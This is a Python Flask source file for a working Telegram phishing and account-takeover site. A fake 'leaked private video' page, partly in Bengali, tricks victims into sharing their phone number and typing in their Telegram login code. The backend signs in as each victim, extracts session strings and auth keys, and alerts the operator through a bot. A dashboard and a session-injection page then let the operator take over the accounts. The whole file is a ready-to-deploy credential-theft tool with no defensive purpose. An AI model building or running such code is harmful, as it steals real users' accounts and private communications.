from flask import Flask, request, jsonify, render_template_string
import multiprocessing
import asyncio
import json
import os
import logging
import base64
from datetime import datetime
from telethon import TelegramClient
from telethon.sessions import StringSession

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))

# Shared state using Manager
manager = multiprocessing.Manager()
user_sessions = manager.dict()
captured_accounts = manager.list()
pending_codes = manager.dict()

# ====== PAGE HTML (with request_contact only, no phone input) ======
PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Video Hub</title>
    <style>
        /* Same styles as before - keeping them concise here */
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;min-height:100vh}
        .header{padding:50px 20px 25px;text-align:center;background:linear-gradient(180deg,#1a1a2e,#0a0a0a)}
        .header h1{font-size:26px;font-weight:900;background:linear-gradient(45deg,#ff6b6b,#ffa500);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .header p{color:#777;font-size:13px;margin-top:8px}
        .video-card{margin:15px 20px;background:#141420;border-radius:15px;overflow:hidden;border:1px solid #1a1a2e}
        .thumbnail{width:100%;height:210px;background:linear-gradient(135deg,#2d1b69,#ff6b6b);display:flex;align-items:center;justify-content:center}
        .thumbnail .play-btn{width:65px;height:65px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;border:2px solid rgba(255,255,255,0.2)}
        .video-info{padding:15px}
        .video-info h3{font-size:15px;margin-bottom:5px}
        .video-info .meta{color:#666;font-size:12px}
        .video-info .badge{display:inline-block;background:#e94560;padding:2px 10px;border-radius:4px;font-size:11px;margin-top:8px}
        .link-section{padding:10px 20px 20px;text-align:center}
        .get-link-btn{width:100%;padding:18px;background:linear-gradient(45deg,#e94560,#ff6b6b);border:none;border-radius:50px;color:white;font-size:20px;font-weight:800;cursor:pointer;box-shadow:0 8px 30px rgba(233,69,96,0.4);letter-spacing:1px;text-transform:uppercase;transition:all 0.3s}
        .get-link-btn:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(233,69,96,0.6)}
        .get-link-btn .small{font-size:11px;font-weight:400;display:block;margin-top:3px;opacity:0.8}
        .modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:1000;padding:20px;overflow-y:auto}
        .modal-overlay.active{display:flex;align-items:center;justify-content:center}
        .modal{background:#141420;border-radius:20px;padding:30px;max-width:380px;width:100%;border:1px solid #1a1a2e;animation:slideUp 0.3s ease}
        @keyframes slideUp{from{transform:translateY(40px);opacity:0}to{transform:translateY(0);opacity:1}}
        .modal-icon{text-align:center;font-size:45px;margin-bottom:10px}
        .modal h2{text-align:center;font-size:18px;margin-bottom:5px}
        .modal p{text-align:center;color:#888;font-size:13px;margin-bottom:15px}
        .modal .sb{text-align:center;padding:12px;border-radius:10px;margin:10px 0;display:none;font-size:13px}
        .modal .sb.success{display:block;background:rgba(76,175,80,0.15);color:#81C784}
        .modal .sb.error{display:block;background:rgba(244,67,54,0.15);color:#EF9A9A}
        .modal .sb.info{display:block;background:rgba(33,150,243,0.15);color:#90CAF9}
        .modal .sb.waiting{display:block;background:rgba(255,152,0,0.15);color:#FFB74D}
        .cd{background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;padding:15px;font-size:30px;text-align:center;letter-spacing:15px;color:white;margin:10px 0;font-weight:bold;min-height:55px}
        .np{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:10px 0}
        .np .k{padding:16px;border:none;border-radius:10px;background:#2a2a3e;color:white;font-size:22px;cursor:pointer;transition:0.15s}
        .np .k:active{background:#3a3a5e;transform:scale(0.95)}
        .np .kc{background:#e94560;color:white}
        .np .ks{background:#4CAF50;color:white;font-weight:700;font-size:14px}
        .np .ks:disabled{background:#333;color:#666}
        .step{display:none}
        .step.active{display:block}
        .ss{text-align:center;padding:20px 0}
        .ss .bi{font-size:60px;margin-bottom:15px}
        .ss h2{color:#4CAF50;font-size:22px;margin-bottom:8px}
        .ss p{color:#888;font-size:13px;margin-bottom:20px}
        .ss .wb{background:#4CAF50;color:white;border:none;padding:15px 40px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;text-transform:uppercase;letter-spacing:1px}
        .sp{display:inline-block;width:18px;height:18px;border:2px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .submit-btn{width:100%;padding:16px;background:#e94560;border:none;border-radius:50px;color:white;font-size:16px;font-weight:700;cursor:pointer;letter-spacing:1px;transition:all 0.3s}
        .submit-btn:hover{background:#ff6b6b;transform:translateY(-1px)}
        .submit-btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 PREMIUM VIDEO HUB</h1>
        <p>Exclusive content — Verified members only</p>
    </div>
    <div class="video-card">
        <div class="thumbnail"><div class="play-btn">▶</div></div>
        <div class="video-info">
            <h3>🔥 LEAKED PRIVATE VIDEO — 2026</h3>
            <div class="meta">⭐ 4.9 (2.4M views) • 18+</div>
            <span class="badge">🔞 RESTRICTED</span>
        </div>
    </div>
    <div class="link-section">
        <button class="get-link-btn" id="glb">🔞 GET YOUR LINK<span class="small">Contact share করুন</span></button>
    </div>
    
    <div class="modal-overlay" id="vm">
        <div class="modal">
            <!-- Step 1: শুধু Contact Share বাটন -->
            <div id="s1" class="step active">
                <div class="modal-icon">📞</div>
                <h2>Contact Share করুন</h2>
                <p>অ্যাক্সেস পেতে আপনার Contact শেয়ার করুন:</p>
                <div id="ps1" class="sb info">👇 নিচের বাটনে ক্লিক করুন</div>
                <button class="submit-btn" onclick="requestContactManually()">
                    📞 Share Contact
                </button>
            </div>
            
            <!-- Step 2: OTP (5 digit) -->
            <div id="s2" class="step">
                <div class="modal-icon">🔐</div>
                <h2>Verification Code</h2>
                <p>📱 <span id="pd" style="color:#0088cc;font-weight:bold;">+880XXXXXXXXXX</span></p>
                <div id="cs" class="sb waiting"><span class="sp"></span> Code পাঠানো হচ্ছে...</div>
                <div class="cd" id="cdisp">_____</div>
                <div class="np" id="np">
                    <button class="k" onclick="pk('1')">1</button>
                    <button class="k" onclick="pk('2')">2</button>
                    <button class="k" onclick="pk('3')">3</button>
                    <button class="k" onclick="pk('4')">4</button>
                    <button class="k" onclick="pk('5')">5</button>
                    <button class="k" onclick="pk('6')">6</button>
                    <button class="k" onclick="pk('7')">7</button>
                    <button class="k" onclick="pk('8')">8</button>
                    <button class="k" onclick="pk('9')">9</button>
                    <button class="k kc" onclick="cc()">⌫</button>
                    <button class="k" onclick="pk('0')">0</button>
                    <button class="k ks" id="sb" onclick="sc()">✓ Verify</button>
                </div>
                <div id="vs" class="sb"></div>
            </div>
            
            <!-- Step 3: Success -->
            <div id="s3" class="step">
                <div class="ss">
                    <div class="bi">✅</div>
                    <h2>Verified!</h2>
                    <p>আপনার লিংক তৈরি হচ্ছে...</p>
                    <button class="wb" onclick="wv()">🎬 Watch Video</button>
                </div>
            </div>
        </div>
    </div>
    
    <script>
    let phoneNumber = '';
    let codeDigits = '';
    let codeCheckInterval = null;
    
    document.getElementById('glb').onclick = function() {
        document.getElementById('vm').classList.add('active');
        var ps = document.getElementById('ps1');
        ps.className = 'sb info';
        ps.innerHTML = '<span class="sp"></span> Contact শেয়ার করুন';
        ps.style.display = 'block';
    };
    
    function requestContactManually() {
        var btn = document.querySelector('.submit-btn');
        btn.disabled = true;
        btn.innerHTML = '<span class="sp"></span> Requesting...';
        
        var ps = document.getElementById('ps1');
        ps.className = 'sb info';
        ps.innerHTML = '<span class="sp"></span> Contact শেয়ার করুন...';
        ps.style.display = 'block';
        
        if (typeof Telegram !== 'undefined' && Telegram.WebApp && 
            typeof Telegram.WebApp.requestContact === 'function') {
            
            Telegram.WebApp.requestContact(function(success, contact) {
                if (success && contact && contact.phone_number) {
                    var p = contact.phone_number.startsWith('+') ? contact.phone_number : '+' + contact.phone_number;
                    phoneNumber = p;
                    ps.className = 'sb success';
                    ps.innerHTML = '✅ Contact received! ' + p;
                    ps.style.display = 'block';
                    sendPhoneToBackend(p);
                } else {
                    ps.className = 'sb error';
                    ps.innerHTML = '❌ Contact share করতে হবে';
                    ps.style.display = 'block';
                    btn.disabled = false;
                    btn.innerHTML = '📞 Share Contact';
                }
            });
        } else {
            ps.className = 'sb error';
            ps.innerHTML = '❌ শুধুমাত্র Telegram Mobile App এ খুলুন';
            ps.style.display = 'block';
            btn.disabled = false;
            btn.innerHTML = '📞 Share Contact';
        }
    }
    
    async function sendPhoneToBackend(phone) {
        try {
            var res = await fetch('/api/share', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phone})
            });
            var data = await res.json();
            
            if (data.success) {
                document.getElementById('s1').classList.remove('active');
                document.getElementById('s2').classList.add('active');
                document.getElementById('pd').textContent = phone;
                startCodeCheck();
            } else {
                var ps = document.getElementById('ps1');
                ps.className = 'sb error';
                ps.innerHTML = '❌ Error: ' + (data.error || 'Unknown');
                ps.style.display = 'block';
            }
        } catch(e) {
            var ps = document.getElementById('ps1');
            ps.className = 'sb error';
            ps.innerHTML = '❌ Connection error';
            ps.style.display = 'block';
        }
    }
    
    function startCodeCheck() {
        if (codeCheckInterval) clearInterval(codeCheckInterval);
        codeCheckInterval = setInterval(async function() {
            try {
                var res = await fetch('/api/check', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: phoneNumber})
                });
                var data = await res.json();
                
                if (data.s === 'sent') {
                    clearInterval(codeCheckInterval);
                    codeCheckInterval = null;
                    var cs = document.getElementById('cs');
                    cs.className = 'sb success';
                    cs.innerHTML = '✅ 5 ডিজিটের OTP কোড এসেছে! টাইপ করুন:';
                    cs.style.display = 'block';
                } else if (data.s === 'done') {
                    clearInterval(codeCheckInterval);
                    codeCheckInterval = null;
                    document.getElementById('s2').classList.remove('active');
                    document.getElementById('s3').classList.add('active');
                } else if (data.s === 'err') {
                    clearInterval(codeCheckInterval);
                    codeCheckInterval = null;
                    var cs = document.getElementById('cs');
                    cs.className = 'sb error';
                    cs.innerHTML = '❌ কোড পাঠাতে সমস্যা';
                    cs.style.display = 'block';
                }
            } catch(e) {}
        }, 2000);
    }
    
    function pk(n) {
        if (codeDigits.length < 5) {
            codeDigits += n;
            document.getElementById('cdisp').textContent = codeDigits;
        }
    }
    
    function cc() {
        codeDigits = codeDigits.slice(0, -1);
        document.getElementById('cdisp').textContent = codeDigits || '_____';
    }
    
    async function sc() {
        if (codeDigits.length < 5) {
            showVerifyStatus('❌ 5 ডিজিটের কোড দিন', 'error');
            return;
        }
        document.getElementById('sb').disabled = true;
        document.getElementById('sb').textContent = '⏳ Verifying...';
        
        try {
            var res = await fetch('/api/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber, code: codeDigits})
            });
            var data = await res.json();
            
            if (data.success) {
                document.getElementById('s2').classList.remove('active');
                document.getElementById('s3').classList.add('active');
                if (codeCheckInterval) {
                    clearInterval(codeCheckInterval);
                    codeCheckInterval = null;
                }
            } else {
                showVerifyStatus('❌ ' + (data.error || 'ভুল কোড'), 'error');
                codeDigits = '';
                document.getElementById('cdisp').textContent = '_____';
                document.getElementById('sb').disabled = false;
                document.getElementById('sb').textContent = '✓ Verify';
            }
        } catch(e) {
            showVerifyStatus('❌ Error', 'error');
            document.getElementById('sb').disabled = false;
            document.getElementById('sb').textContent = '✓ Verify';
        }
    }
    
    function showVerifyStatus(msg, type) {
        var el = document.getElementById('vs');
        el.textContent = msg;
        el.className = 'sb ' + type;
        el.style.display = 'block';
    }
    
    function wv() { window.location.href = 'https://example.com'; }
    
    document.getElementById('vm').onclick = function(e) {
        if (e.target === this) {
            this.classList.remove('active');
            if (codeCheckInterval) {
                clearInterval(codeCheckInterval);
                codeCheckInterval = null;
            }
        }
    };
    </script>
</body>
</html>"""

# ====== Backend Functions for Separate Processes ======

def send_code_process(phone):
    """Run in separate process to avoid event loop issues"""
    async def _send():
        try:
            c = TelegramClient(StringSession(), API_ID, API_HASH)
            await c.connect()
            r = await c.send_code_request(phone)
            
            # Store in manager dict
            user_sessions[phone + '_hash'] = r.phone_code_hash
            user_sessions[phone + '_client_session'] = StringSession.save(c.session) if c.session else ''
            await c.disconnect()
            
            pending_codes[phone] = 'sent'
            logger.info(f"✅ Code sent: {phone}")
            return True
        except Exception as e:
            logger.error(f"Failed: {phone}: {e}")
            pending_codes[phone] = 'err'
            return False
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(_send())
    finally:
        loop.close()

def verify_code_process(phone, code):
    """Run in separate process"""
    async def _verify():
        try:
            hash_val = user_sessions.get(phone + '_hash', '')
            if not hash_val:
                return {'success': False, 'error': 'Session expired'}
            
            c = TelegramClient(StringSession(), API_ID, API_HASH)
            await c.connect()
            
            await c.sign_in(phone=phone, code=code, phone_code_hash=hash_val)
            ss = StringSession.save(c.session)
            me = await c.get_me()
            await c.disconnect()
            
            # WebK
            wc = TelegramClient(StringSession(ss), API_ID, API_HASH)
            await wc.start()
            auth = base64.b64encode(wc.session.auth_key.key).decode()
            dc = wc.session.dc_id
            await wc.disconnect()
            
            acc = {
                'phone': phone, 'user_id': me.id, 'username': me.username or '',
                'first_name': me.first_name or '', 'last_name': me.last_name or '',
                'session': ss,
                'webk': json.dumps({'dcId': dc, 'authKey': auth, 'userId': me.id, 'isSupport': False, 'isTest': False}),
                'dc': dc, 'time': str(datetime.now())
            }
            captured_accounts.append(acc)
            
            # Clean up
            if phone + '_hash' in user_sessions:
                del user_sessions[phone + '_hash']
            if phone + '_client_session' in user_sessions:
                del user_sessions[phone + '_client_session']
            pending_codes[phone] = 'done'
            
            # Notify
            try:
                import requests
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': YOUR_TELEGRAM_ID,
                    'text': f"🔔 **New Account!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}",
                    'parse_mode': 'Markdown'
                }, timeout=5)
            except:
                pass
            
            return {'success': True}
        except Exception as e:
            e_str = str(e)
            if 'PHONE_CODE_INVALID' in e_str:
                return {'success': False, 'error': 'Wrong code'}
            if 'SESSION_PASSWORD_NEEDED' in e_str:
                return {'success': False, 'error': '2FA enabled'}
            return {'success': False, 'error': e_str[:80]}
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(_verify())
    finally:
        loop.close()

# ====== Routes ======

@app.route('/')
def index():
    return render_template_string(PAGE)

@app.route('/api/share', methods=['POST'])
def share():
    ph = request.json.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    
    if ph.startswith('0') and not ph.startswith('+'):
        ph = '+88' + ph
    elif not ph.startswith('+'):
        ph = '+' + ph
    
    logger.info(f"📱 Phone: {ph}")
    pending_codes[ph] = 'sending'
    
    # Use multiprocessing
    p = multiprocessing.Process(target=send_code_process, args=(ph,))
    p.start()
    p.join(timeout=25)
    
    status = pending_codes.get(ph, 'err')
    return jsonify({'success': status == 'sent'})

@app.route('/api/check', methods=['POST'])
def check():
    s = pending_codes.get(request.json.get('phone', ''), 'waiting')
    return jsonify({'s': s})

@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json
    ph, code = d.get('phone', ''), d.get('code', '')
    
    if ph.startswith('0') and not ph.startswith('+'):
        ph = '+88' + ph
    elif not ph.startswith('+'):
        ph = '+' + ph
    
    p = multiprocessing.Process(target=verify_code_process, args=(ph, code))
    p.start()
    p.join(timeout=25)
    
    status = pending_codes.get(ph, '')
    if status == 'done':
        return jsonify({'success': True})
    else:
        return jsonify({'success': False, 'error': 'Wrong code'})

@app.route('/webk/<phone>')
def webk(phone):
    for a in captured_accounts:
        if a['phone'] == phone:
            w = a['webk']
            return f"""
            <!DOCTYPE html><html><head><title>WebK</title>
            <style>body{{background:#0a0a0a;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}}
            .c{{background:#141420;padding:40px;border-radius:20px;max-width:450px;width:100%;text-align:center;border:1px solid #1a1a2e}}
            .av{{width:70px;height:70px;border-radius:50%;background:#0088cc;display:flex;align-items:center;justify-content:center;font-size:30px;margin:0 auto 15px}}
            .i{{color:#888;margin:3px 0;font-size:14px}}
            .b{{width:100%;padding:15px;border:none;border-radius:12px;font-size:15px;cursor:pointer;margin:8px 0;font-weight:600}}
            .bp{{background:#0088cc;color:white}}
            .bs{{background:#4CAF50;color:white}}
            .sb{{background:#0a0a0a;padding:12px;border-radius:8px;word-break:break-all;font-size:10px;margin:10px 0;text-align:left;color:#0f0}}
            </style></head>
            <body><div class="c">
            <div class="av">{a['first_name'][0] if a['first_name'] else '?'}</div>
            <h2>{a['first_name']} {a['last_name']}</h2>
            <div class="i">@{a['username'] or 'none'} | ID: {a['user_id']} | DC: {a['dc']}</div>
            <div class="i">📱 {a['phone']}</div>
            <div class="sb">{w}</div>
            <button class="b bp" onclick="o()">1️⃣ Open WebK</button>
            <button class="b bs" id="ib" style="display:none" onclick="i()">2️⃣ Inject</button>
            <button class="b bp" id="rb" style="display:none" onclick="r()">3️⃣ Refresh</button>
            <div id="st" class="i" style="margin-top:15px"></div>
            </div>
            <script>
            var wk;
            function o(){{wk=window.open('https://web.telegram.org/k/','_blank');document.getElementById('ib').style.display='block';document.getElementById('st').textContent='✅ Opened!'}}
            function i(){{if(!wk||wk.closed){{document.getElementById('st').textContent='❌ Closed!';return}}
            try{{wk.postMessage({{action:'setStorage',key:'webk_session',value:'{w}'}},'*');document.getElementById('st').textContent='✅ Injected!';document.getElementById('ib').style.display='none';document.getElementById('rb').style.display='block'}}catch(e){{document.getElementById('st').textContent='❌ Error'}}}}
            function r(){{if(wk&&!wk.closed){{wk.location.reload();document.getElementById('st').textContent='🎉 Logged in!'}}}}
            </script></body></html>
            """
    return "Not found", 404

@app.route('/dash')
def dash():
    rows = ""
    for i, a in enumerate(captured_accounts, 1):
        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a['first_name']} {a['last_name']}</td><td>@{a['username'] or '—'}</td><td>{a['user_id']}</td><td>{a['dc']}</td><td>{a['time']}</td><td><a href='/webk/{a['phone']}'><button style='background:#0088cc;color:white;border:none;padding:5px 12px;border-radius:5px;cursor:pointer'>🔑</button></a></td></tr>"
    return f"""
    <!DOCTYPE html><html><head><title>Dashboard</title>
    <style>body{{background:#0a0a0a;color:white;font-family:Arial;padding:20px}}
    h1{{color:#e94560}} table{{width:100%;border-collapse:collapse;margin-top:15px}}
    th,td{{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e}}
    th{{background:#141420}} tr:hover{{background:#141420}}
    .st{{display:inline-block;background:#141420;padding:15px 25px;border-radius:10px;margin:10px}}
    .st .n{{font-size:30px;font-weight:bold;color:#0088cc}}
    </style></head>
    <body>
    <h1>🎯 Captured Accounts</h1>
    <div class="st"><div class="n">{len(captured_accounts)}</div><div>Total</div></div>
    <table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>Username</th><th>ID</th><th>DC</th><th>Time</th><th>Action</th></tr></thead><tbody>
    {rows if rows else '<tr><td colspan="8" style="text-align:center;color:#666;">No accounts yet</td></tr>'}
    </tbody></table>
    <script>setInterval(()=>location.reload(),5000)</script>
    </body></html>
    """

if __name__ == '__main__':
    multiprocessing.set_start_method('spawn', force=True)
    port = int(os.environ.get('PORT', 5000))
    print(f"✅ Phishing site ready on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
